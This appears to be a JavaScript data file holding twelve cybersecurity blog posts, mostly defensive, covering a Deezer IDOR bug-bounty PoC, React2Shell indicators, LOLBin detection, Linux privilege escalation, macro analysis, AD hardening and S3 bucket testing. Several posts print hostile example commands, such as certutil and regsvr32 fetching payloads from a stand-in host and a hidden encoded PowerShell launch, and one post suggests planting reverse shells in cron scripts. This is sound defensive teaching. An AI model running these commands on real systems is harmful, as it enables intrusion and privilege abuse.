export const blogPosts = [
  {
    id: 1,
    title: "Disclosure of Private Playlist Metadata (Deezer IDOR)",
    date: "Dec 19, 2025",
    category: "bug-bounty",
    badge: "Bug Bounty Writeup",
    badgeType: "gold",
    excerpt: "A deep dive into an IDOR vulnerability I discovered in Deezer's legacy API. This logic flaw allowed authenticated users to bypass privacy controls and access full metadata of private playlists belonging to other users.",
    content: `
      <p><strong>Program:</strong> Deezer Bug Bounty Program<br>
      <strong>Severity:</strong> Medium (Confidentiality Loss)<br>
      <strong>Status:</strong> Resolved & Rewarded (€250)</p>

      <h3>Summary</h3>
      <p>I identified an Insecure Direct Object Reference (IDOR) vulnerability within the Deezer legacy API that allows an authenticated attacker to retrieve the full metadata of Private Playlists that do not belong to them.</p>

      <h3>Vulnerability Description</h3>
      <p>While the API correctly filters the actual song list (returning an empty array for unauthorized users), it fails to restrict access to the playlist's details. The API returns the Title, Description, Creator Name, Creation Date, and Song Count, even when the playlist status is explicitly set to Private.</p>

      <h3>Discovery & Behavior Analysis</h3>
      <p>During the analysis of the <code>deezer.pagePlaylist</code> method, I observed the following:</p>
      <ul>
          <li><strong>Expected Behavior:</strong> Accessing a Private playlist ID owned by another user should return a 403 Forbidden or 404 Not Found.</li>
          <li><strong>Actual Behavior:</strong> The server returned a 200 OK status. The JSON response contained the full playlist metadata object (DATA), revealing sensitive details like the Title and Description, despite filtering the song list.</li>
      </ul>

      <h3>Proof of Concept (PoC)</h3>
      <p><strong>Attacker Request:</strong></p>
      <pre><code>POST /ajax/gw-light.php?method=deezer.pagePlaylist&input=3&api_version=1.0 HTTP/2
Host: www.deezer.com
Content-Type: application/json

{
  "playlist_id": 14575894321,
  "lang": "en",
  "nb": 50,
  "start": 0,
  "tags": true,
  "header": true
}</code></pre>
      <p><strong>Server Response (Leak):</strong></p>
      <pre><code>{
  "results": {
    "DATA": {
      "PLAYLIST_ID": "14575894321",
      "TITLE": "demo testing",
      "STATUS": 1,
      "DESCRIPTION": "for idor check",
      "IS_PUBLIC": false
    }
  }
}</code></pre>

      <h3>Impact</h3>
      <p>In a real-world attack scenario, a malicious actor could exploit this vulnerability for:</p>
      <ul>
          <li><strong>User Profiling:</strong> Enumerating playlist IDs to collect titles that reveal personal context (e.g., "Medical Recovery", "Protest Planning").</li>
          <li><strong>Social Engineering:</strong> Leveraging this metadata to craft highly convincing phishing emails targeting specific users based on their private interests.</li>
      </ul>

      <h3>Remediation</h3>
      <p>The backend logic for <code>deezer.pagePlaylist</code> was updated to check permissions <strong>before</strong> fetching the DATA object, ensuring a 403 Forbidden response for unauthorized requests.</p>
    `
  },
  {
    id: 2,
    title: "React2Shell (CVE-2025-55182): Active Exploitation Analysis",
    date: "Dec 13, 2025",
    category: "cve threat-intel",
    badge: "Critical RCE",
    badgeType: "red",
    excerpt: "Deep dive into the CVSS 10.0 RCE in React Server Components. Analysis of active campaigns dropping MINOCAT tunnelers and XMRig miners.",
    content: `
      <p>A new critical unauthenticated remote code execution (RCE) vulnerability in React Server Components, tracked as <strong>CVE-2025-55182</strong> (aka "React2Shell"), is being actively exploited in the wild. With a CVSS score of 10.0, this is a "drop everything and patch" event.</p>
      
      <h3>The Vulnerability</h3>
      <p>The flaw allows unauthenticated attackers to send a single HTTP request that executes arbitrary code with the privileges of the web server process. It affects <code>react-server-dom-webpack</code>, <code>react-server-dom-parcel</code>, and <code>react-server-dom-turbopack</code> (versions 19.0 - 19.2.0).</p>
      
      <h3>Active Exploitation in the Wild</h3>
      <p>Threat Intelligence groups have observed multiple clusters exploiting this:</p>
      <ul>
          <li><strong>MINOCAT Tunneler:</strong> Threat-nexus actors are deploying a bash script to create hidden directories (<code>$HOME/.systemd-utils</code>), kill legit processes, and install the MINOCAT tunneler for persistence.</li>
          <li><strong>Crypto Miners:</strong> Financially motivated actors are dropping XMRig miners via bash drop files, establishing persistence via systemd services.</li>
          <li><strong>Web Shells:</strong> Advanced exploits are deploying in-memory Next.js web shells.</li>
      </ul>

      <h3>SOC Analyst Hunt Guide</h3>
      <p>If you are monitoring React or Next.js workloads, hunt for these indicators:</p>
      <ul>
          <li><strong>File System:</strong> Creation of hidden directories like <code>$HOME/.systemd-utils</code>.</li>
          <li><strong>Process Execution:</strong> <code>wget</code> or <code>cURL</code> commands initiated directly by web server processes.</li>
          <li><strong>Network:</strong> Outbound connections to unknown/unverified IPs containing base64 shells like <code>reactcdn.windowserrorapis[.]com</code>.</li>
      </ul>

      <h3>Mitigation</h3>
      <p><strong>Patch Immediately:</strong> Update React Server Components to version 19.2.3 or higher. If patching isn't possible immediately, deploy WAF rules to block the exploit payloads.</p>
    `
  },
  {
    id: 3,
    title: "Hunting Living-Off-The-Land Binaries (LOLBins) with Sysmon",
    date: "Feb 02, 2026",
    category: "blue-team",
    badge: "Threat Hunting",
    badgeType: "blue",
    excerpt: "Identifying advanced attackers relying on pre-installed, dual-use system administration tools like Certutil, PowerShell, and WMI to evade EDR and firewall detection schemas.",
    content: `
      <p>A "Living off the Land Binary" (LOLBin) is any legitimate OS binary that can be co-opted by attackers to execute malicious code, bypass execution restrictions, or download files without triggering signature-based alerts.</p>
      
      <h3>Why are LOLBins Dangerous?</h3>
      <p>Since these binaries (like <code>certutil.exe</code>, <code>regsvr32.exe</code>, or <code>bitsadmin.exe</code>) are digitally signed by Microsoft and native to the OS, standard Antivirus platforms often whitelist their execution outright.</p>

      <h3>1. Certutil for File Downloads</h3>
      <p><code>certutil.exe</code> is intended for handling certificates, but attackers frequently use its <code>-urlcache</code> flag to download payloads directly from external IPs.</p>
      <pre><code>certutil.exe -urlcache -split -f "http://10.10.10.5/payload.exe" C:\\Windows\\Temp\\payload.exe</code></pre>
      <p><strong>Detection Logic (Sysmon Event ID 1):</strong> Hunt for process creations of <code>certutil.exe</code> where the command line contains both <code>-urlcache</code> and <code>-split</code>.</p>

      <h3>2. Regsvr32 for AppLocker Bypass</h3>
      <p>The "Squiblydoo" technique uses <code>regsvr32.exe</code> to load a COM scriptlet directly from the internet, executing code in memory and easily bypassing AppLocker policies.</p>
      <pre><code>regsvr32 /s /n /u /i:http://malware.com/payload.sct scrobj.dll</code></pre>
      <p><strong>Detection Logic:</strong> Monitor for <code>regsvr32.exe</code> executing with the <code>/i</code> flag, especially when pointing to HTTP/S URLs and loading <code>scrobj.dll</code>.</p>

      <h3>3. PowerShell Downgrade Attacks</h3>
      <p>Security teams often enable PowerShell auditing (Script Block Logging - Event ID 4104). Attackers evade this by spawning older versions of PowerShell (like version 2) which lack advanced logging hooks.</p>
      <pre><code>powershell.exe -version 2 -w hidden -enc [BASE64]</code></pre>
      <p><strong>Detection Logic:</strong> Alert on any <code>powershell.exe</code> execution containing the <code>-version 2</code> argument, as legitimate administration rarely requires forcing version 2 execution.</p>

      <h3>Proactive Defense</h3>
      <p>If these utilities are not used by valid system administrators, use Application Control to block them outright. For monitoring, deep command-line auditing via Sysmon combined with SIEM correlation is non-negotiable.</p>
    `
  },
  {
    id: 4,
    title: "The Art of Privilege Escalation: From User to Root",
    date: "Dec 01, 2025",
    category: "red-team",
    badge: "Red Team",
    badgeType: "red",
    excerpt: "Mastering the climb. Exploring common Linux misconfigurations, SUID binaries, and kernel exploits to elevate privileges in a compromised environment.",
    content: `
      <p>Gaining initial access is only the first step. To truly compromise a system, you often need root privileges. This post explores common Linux privilege escalation vectors.</p>
      <h3>1. Kernel Exploits</h3>
      <p>Old kernels are a goldmine. Using <code>uname -a</code> can reveal the kernel version. If it's outdated, tools like <strong>DirtyCOW</strong> or <strong>PwnKit</strong> (CVE-2021-4034) might provide an instant root shell.</p>
      <h3>2. SUID Binaries</h3>
      <p>Binaries with the SUID bit set run with the privileges of the file owner (often root). Find them using: <code>find / -perm -4000 2>/dev/null</code>. If a binary like <code>nmap</code> or <code>vim</code> has SUID set, you can often spawn a root shell.</p>
      <h3>3. Misconfigured Cron Jobs</h3>
      <p>If a cron job runs a script that you can write to, you can simply add a reverse shell payload to it. The system will execute your malicious code with the privileges of the cron user (usually root).</p>
      <h3>Tools of the Trade</h3>
      <p>Automate your enumeration with scripts like <strong>LinPEAS</strong> or <strong>LinEnum</strong>. They highlight potential vectors in bright colors, saving you hours of manual searching.</p>
    `
  },
  {
    id: 5,
    title: "Analysing Malicious Office Macros via OLEVBA",
    date: "Jan 10, 2026",
    category: "cve threat-intel",
    badge: "Malware Analysis",
    badgeType: "gold",
    excerpt: "Static analysis breakdown of malicious heavily obfuscated VBA Macros delivered via Phishing campaigns. A deep dive into extracting execution strings using OLEVBA.",
    content: `
      <p>Despite Microsoft's recent push to block VBA macros originating from the internet (Mark of the Web), macro-enabled Office documents (<code>.docm</code>, <code>.xlsm</code>) remain heavily prevalent in spear-phishing campaigns. Examining these files without executing them is critical for safe SOC operations.</p>
      
      <h3>The Setup: Dissecting the Document</h3>
      <p>Modern office documents are effectively Zip archives containing XML structures. However, legacy formats and embedded OLE objects hide VBA streams that require specific extraction tools.</p>
      <p>For triage, <strong>OLEVBA</strong> (from the oletools suite) is the definitive standard for parsing streams dynamically.</p>

      <h3>VBA Obfuscation Techniques</h3>
      <p>When reviewing the macro code extracted by OLEVBA, you will rarely see a clear <code>DownloadFile()</code> command. Instead, you'll see sophisticated obfuscation:</p>
      <ul>
          <li><strong>String Reversal:</strong> Writing payloads backwards (e.g., <code>exe.daolyap</code>) and using built-in string reversal functions right before execution.</li>
          <li><strong>Chr() Encoding:</strong> Passing ASCII decimal arrays <code>Chr(112) & Chr(111) & Chr(119)...</code> to build <code>powershell</code> dynamically.</li>
          <li><strong>Junk Code Injection:</strong> Massive blocks of commented code or useless variable declarations specifically designed to disrupt signature detection.</li>
      </ul>

      <h3>Extracting the Execution Chain</h3>
      <p>Using <code>olevba --decode</code> will often trigger built-in emulation to reveal these hidden payloads automatically.</p>
      <pre><code>$ olevba invoice_urgent.docm

===============================================================================
FILE: invoice_urgent.docm
Type: OpenXML
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: word/vbaProject.bin - OLE stream: 'VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
    Call ExecuteReversedStr
End Sub
...
-------------------------------------------------------------------------------
[+ Suspicious Keyword Found: CreateObject (used to instanciate WScript.Shell)]
[+ Executable Command Decoded: 'powershell.exe -w hidden -c IEX ...']
</code></pre>

      <h3>Conclusion</h3>
      <p>Always perform static analysis of VBA macros in dedicated, isolated virtual machines (such as REMnux) before progressing to dynamic debugging, and never open suspicious files on a corporate endpoint.</p>
    `
  },
  {
    id: 6,
    title: "Supply Chain Security: Deep Dive into the XZ Backdoor (CVE-2024-3094)",
    date: "March 20, 2026",
    category: "cve threat-intel",
    badge: "Supply Chain",
    badgeType: "red",
    excerpt: "Deconstructing the most sophisticated supply chain attack in recent history. A multi-year social engineering effort that almost compromised the global Linux infrastructure.",
    content: `
      <p>The discovery of <strong>CVE-2024-3094</strong>, a backdoor in the <code>xz</code> compression library (specifically <code>liblzma</code>), sent shockwaves through the cybersecurity community. It wasn't just another vulnerability; it was a masterclass in patient, professional-grade social engineering and technical obfuscation.</p>
      
      <h3>The Long Game: Social Engineering</h3>
      <p>Unlike many exploits that rely on a single technical flaw, the XZ backdoor was the result of a multi-year effort by an attacker (under the alias \"Jia Tan\") to gain maintainer status. By contributing legitimate fixes over two years, the attacker built enough trust to eventually inject a complex, multi-stage backdoor into the build process.</p>
      
      <h3>Technical Complexity</h3>
      <p>The backdoor was hidden within binary test files, appearing as harmless data. During the <code>m4</code> configuration and <code>make</code> process, these files were extracted and used to modify the <code>liblzma</code> library at build time. The final payload targeted <code>sshd</code> on systemd-based Linux distributions, allowing unauthorized remote execution via a specifically crafted key.</p>
      
      <h3>The SOC's Perspective</h3>
      <p>From a defensive standpoint, this highlights a critical blind spot: <strong>Upstream Dependency Integrity</strong>. Standard vulnerability scanners (SCA tools) only find *known* CVEs. To detect a \"Day Zero\" backdoor like this, SOCs need to monitor for:</p>
      <ul>
          <li><strong>Outbound Network Spikes:</strong> Unexpected traffic from core system services.</li>
          <li><strong>Performance Regressions:</strong> The XZ backdoor was ultimately caught because it caused a slight (0.5s) delay in SSH logins.</li>
          <li><strong>Anomalous Binary Behavior:</strong> Using tools like <code>strace</code> or <code>ltrace</code> to observe system calls during service startup.</li>
      </ul>
      
      <h3>Key Takeaway</h3>
      <p>Supply chain security is no longer just about patching; it's about verifying the pedigree of every component in our stack. Zero Trust must extend to our dependencies.</p>
    `
  },
  {
    id: 7,
    title: "SOC Operational Excellence: Building Effective Playbooks",
    date: "Feb 15, 2026",
    category: "blue-team",
    badge: "SOC Operations",
    badgeType: "blue",
    excerpt: "Professionalizing the incident response lifecycle. How to build repeatable, measurable playbooks that reduce Mean Time to Respond (MTTR) and ensure consistency.",
    content: `
      <p>A SOC is only as good as its playbooks. Without structured response procedures, analysts default to "ad-hoc" investigation, leading to inconsistent results, missed IOCs, and high MTTR (Mean Time to Respond).</p>
      
      <h3>The Anatomy of a Professional Playbook</h3>
      <p>Every effective SOC playbook should follow the SANS Incident Handling lifecycle while providing granular, technical instructions for the analyst:</p>
      <ol>
          <li><strong>Preparation:</strong> Ensuring the right logs (Sysmon, CrowdStrike, Firewall) are flowing into the SIEM.</li>
          <li><strong>Identification/Triage:</strong> Using standardized logic to distinguish True Positives from False Positives (e.g., "If source IP is internal AND destination is a known C2...").</li>
          <li><strong>Containment:</strong> Step-by-step guides for host isolation, credential reset, or firewall blocking.</li>
          <li><strong>Eradication:</strong> Removing the root cause (e.g., deleting a scheduled task or a malicious binary).</li>
          <li><strong>Recovery:</strong> Restoring systems to clean states.</li>
          <li><strong>Lessons Learned:</strong> Mandatory feedback loop to improve detection rules.</li>
      </ol>
      
      <h3>Automation & SOAR</h3>
      <p>Modern playbooks shouldn't be static PDFs. By leveraging <strong>SOAR</strong> (Security Orchestration, Automation, and Response), we can automate the "grunt work":</p>
      <ul>
          <li>Auto-enriching IPs via VirusTotal or AbuseIPDB.</li>
          <li>Auto-checking if an email sender has a low domain reputation.</li>
          <li>Providing "one-click" host isolation buttons for analysts.</li>
      </ul>
      
      <h3>Continuous Improvement</h3>
      <p>Playbooks are living documents. We perform monthly reviews of our most-triggered alerts to identify areas where the playbook logic failed or where automation could further reduce the burden on our L1 analysts.</p>
    `
  },
  {
    id: 8,
    title: "Purple Teaming: Operationalizing the Feedback Loop",
    date: "Jan 28, 2026",
    category: "blue-team",
    badge: "Purple Team",
    badgeType: "violet",
    excerpt: "Moving beyond silos. How to leverage offensive insights to validate and harden defensive controls through iterative simulation and detection engineering.",
    content: `
      <p>Purple Teaming is not just a "meeting" between Red and Blue teams; it is a systematic methodology to bridge the gap between offensive capabilities and defensive resilience.</p>
      
      <h3>The Purple Team Cycle</h3>
      <p>In our SOC, we operate on a recursive Purple Team cycle:</p>
      <ol>
          <li><strong>Threat Hypothesis:</strong> Select a MITRE ATT&CK technique (e.g., T1055 - Process Injection).</li>
          <li><strong>Offensive Simulation:</strong> The (internal or external) Red Team executes a controlled simulation of the technique in a lab or staging environment.</li>
          <li><strong>Defensive Triage:</strong> The Blue Team checks if the activity was logged (Visibility) and if it triggered an alert (Detection).</li>
          <li><strong>Gap Analysis:</strong> If detection failed, we ask: "Was it because of log misconfiguration, or was the detection rule too narrow?"</li>
          <li><strong>Detection Engineering:</strong> We author and test new Sigma or Splunk rules based on the telemetry captured during simulation.</li>
      </ol>
      
      <h3>Real-World Example: LSASS Memory Dumping</h3>
      <p>During a recent exercise, we simulated LSASS dumping using <code>procdump.exe</code>. While our EDR caught the activity, our SIEM didn't alert because the Sysmon rules were only looking for <code>mimikatz</code>. By broadening our detection to look for specific access masks on the LSASS process (Event ID 10), we hardened our defense against future "Day Zero" credential theft tools.</p>
      
      <h3>Conclusion</h3>
      <p>By treating security as a collaborative, iterative process rather than a static wall, we ensure that our defenses are grounded in reality, not just theory. That is the true value of a Purple Team approach.</p>
    `
  },
  {
    id: 9,
    title: "Active Directory Security: Hardening the Kingdom",
    date: "March 05, 2026",
    category: "blue-team",
    badge: "Enterprise Security",
    badgeType: "blue",
    excerpt: "Why Active Directory remains the ultimate target for attackers. A strategic guide to hardening domain controllers and implementing tiered administration to prevent lateral movement.",
    content: `
      <p>Active Directory (AD) is the backbone of most corporate networks, and because it controls identity and access, it is the primary target for attackers after gaining initial access. If an attacker controls the Domain Controller (DC), they control the organization.</p>
      
      <h3>Common Attack Vectors</h3>
      <p>Most AD compromises don't start with a complex exploit; they start with misconfigurations:</p>
      <ul>
          <li><strong>Kerberoasting:</strong> Stealing service account tickets to crack their passwords offline.</li>
          <li><strong>AS-REP Roasting:</strong> Targeting accounts with "Do not require Kerberos preauthentication" enabled.</li>
          <li><strong>Privileged Group Overload:</strong> Too many users in the "Domain Admins" group, violating the principle of least privilege.</li>
      </ul>
      
      <h3>Strategic Hardening: The Tiered Model</h3>
      <p>The most effective defense against AD lateral movement is the <strong>Microsoft Tiered Administration Model</strong>:</p>
      <ul>
          <li><strong>Tier 0:</strong> Highest level. Domain Controllers, Domain Admins, and identity management systems. Admins here *never* log into workstations or servers.</li>
          <li><strong>Tier 1:</strong> Enterprise servers and applications.</li>
          <li><strong>Tier 2:</strong> Workstations and user devices.</li>
      </ul>
      <p>By enforcing these boundaries, you ensure that if a Tier 2 workstation is compromised, the attacker cannot scrape the credentials of a Tier 0 admin who might have logged in to troubleshoot.</p>
      
      <h3>Blue Team Tip: Monitoring for DCSync</h3>
      <p>Keep a close eye on <strong>DS-Replication-Get-Changes-All</strong> rights. An attacker with these rights can use the DCSync technique to dump the entire NTDS.dit database without touching the DC's memory, effectively stealing every password hash in the domain.</p>
    `
  },
  {
    id: 10,
    title: "The Rise of AI-Driven Phishing: A Modern Threat",
    date: "Feb 28, 2026",
    category: "cve threat-intel",
    badge: "Emerging Threat",
    badgeType: "red",
    excerpt: "How Large Language Models (LLMs) are being used to craft hyper-realistic, personalized phishing campaigns that bypass traditional email filters and user awareness training.",
    content: `
      <p>The days of "broken English" and obvious spelling errors in phishing emails are over. Modern threat actors are now leveraging Large Language Models (LLMs) to automate the delivery of sophisticated, highly personalized social engineering attacks at scale.</p>
      
      <h3>What has changed?</h3>
      <p>Previously, a high-quality "spear-phishing" attack required hours of manual research on a target. Today, AI can:</p>
      <ul>
          <li><strong>Scrape LinkedIn/Social Media:</strong> Automatically gather context about a target's role, recent projects, and professional tone.</li>
          <li><strong>Clone Writing Styles:</strong> Replicate the exact tone of a CEO or IT manager based on public memos or past emails.</li>
          <li><strong>Generate Dynamic Payloads:</strong> Create unique, varying text for every recipient, making signature-based detection (which looks for identical phishing strings) much less effective.</li>
      </ul>
      
      <h3>Vishing and Deepfakes</h3>
      <p>Beyond text-based phishing, we are seeing a spike in <strong>AI Voice Cloning (Vishing)</strong>. Attackers only need a 30-second clip of a person's voice to clone it well enough to fool an employee over a brief phone call, often requesting "urgent" wire transfers or MFA resets.</p>
      
      <h3>Defensive Strategy</h3>
      <p>Traditional awareness training (looking for typos) is no longer enough. Organizations must shift toward:</p>
      <ul>
          <li><strong>Strict Process-Based Controls:</strong> No sensitive action (wire transfer, password reset) should be performed via email or voice alone; out-of-band verification is mandatory.</li>
          <li><strong>AI-Powered Security Filters:</strong> Using machine learning to detect anomalous writing patterns that "feel" artificial.</li>
          <li><strong>Hardware MFA:</strong> Using FIDO2/Passkeys (like YubiKeys) to make "credential harvesting" pages useless, regardless of how convincing the phishing email is.</li>
      </ul>
    `
  },
  {
    id: 11,
    title: "Optimizing Microsoft Sentinel for SOC L1 Analysts",
    date: "Feb 10, 2026",
    category: "blue-team",
    badge: "SOC Strategy",
    badgeType: "blue",
    excerpt: "A tactical guide to reducing alert fatigue in Azure Sentinel. How to use KQL functions, watchlists, and automation rules to surface the signals that truly matter.",
    content: `
      <p>As a SOC L1 analyst, I've spent thousands of hours in <strong>Microsoft Sentinel</strong>. If not tuned correctly, Sentinel can become a "wall of noise." The key to effective monitoring is moving beyond simple "IF activity THEN alert" logic.</p>
      
      <h3>1. Leveraging Watchlists for Context</h3>
      <p>Instead of hardcoding "Expected IPs" into dozens of KQL rules, use <strong>Watchlists</strong>. This allows you to update a central list of authorized VPN ranges or VIP users without touching the underlying detection logic. It makes the SOC more agile and reduces false positives significantly.</p>
      
      <h3>2. The Power of KQL Functions</h3>
      <p>Don't repeat yourself. If you have a complex logic for identifying "Anomalous Sign-ins from New Countries," save it as a <strong>Function</strong>. This allows other analysts to call your logic with one word (e.g., <code>GetAnomalousLogins()</code>) across multiple hunting queries.</p>
      
      <h3>3. Entity Mapping: The Key to Investigation</h3>
      <p>Always ensure your Analytics Rules are mapping <strong>Entities</strong> (Accounts, IPs, Hosts) correctly. This allows Sentinel to automatically build a "Graph" of the incident, showing you how a single IP connected to multiple failed logins across different accounts, saving you 20 minutes of manual pivoting per case.</p>
      
      <h3>4. Use Automation for Suppression</h3>
      <p>If a specific "Known Good" system triggers a "Potential Scanning" alert every Tuesday at 2 PM during a vulnerability scan, don't just close it. Build an <strong>Automation Rule</strong> to auto-resolve that specific incident if the source IP matches your scanner. Focus your human brain on the threats that *can't* be automated.</p>
    `
  },
  {
    id: 12,
    title: "Exploiting Misconfigured S3 Buckets: A Common Cloud Flaw",
    date: "Jan 15, 2026",
    category: "bug-bounty",
    badge: "Cloud Security",
    badgeType: "gold",
    excerpt: "A bug bounty hunter's perspective on identifying and exploiting public S3 buckets. Why technical 'defaults' are still one of the leading causes of massive data leaks.",
    content: `
      <p>Despite years of warnings, "Leaky S3 Buckets" remain one of the most common findings in bug bounty programs. When developers prioritize speed over security, they often leave cloud storage accessible to the public, inadvertently exposing TBs of sensitive data.</p>
      
      <h3>How I Find Them</h3>
      <p>The first step is <strong>Subdomain Enumeration</strong> and <strong>Fuzzing</strong>. Tools like <code>ffuf</code> or <code>gobuster</code> pointing at common naming conventions (e.g., <code>company-prod-backup</code>, <code>test-data-internal</code>) often reveal the URL endpoints for these buckets.</p>
      
      <h3>Testing for Public Access</h3>
      <p>Once a potential bucket URL is found (e.g., <code>https://target-dev.s3.amazonaws.com</code>), I use the AWS CLI to test permissions:</p>
      <pre><code>aws s3 ls s3://target-dev --no-sign-request</code></pre>
      <p>If the response lists files, the bucket has "List" permissions enabled for the world. The real "jackpot" is "Write" permission, which allows an attacker to upload their own malicious files, potentially leading to stored XSS or even remote code execution if the bucket hosts web assets.</p>
      
      <h3>The "Bypass" - Authenticated Users</h3>
      <p>A common mistake developers make is setting permissions to <strong>"All Authenticated Users"</strong>. They assume this means "Users in my AWS account," but it actually means <strong>"Anyone with a valid AWS account"</strong> (including the attacker). This is a critical distinction that often leads to "Full Control" findings.</p>
      
      <h3>Remediation for Developers</h3>
      <ol>
          <li>Enable <strong>"Block Public Access"</strong> at the account level.</li>
          <li>Use <strong>IAM Roles</strong> and <strong>Bucket Policies</strong> instead of ACLs (Legacy).</li>
          <li>Implement <strong>VPC Endpoints</strong> so your S3 traffic never even touches the public internet.</li>
      </ol>
    `
  }
];
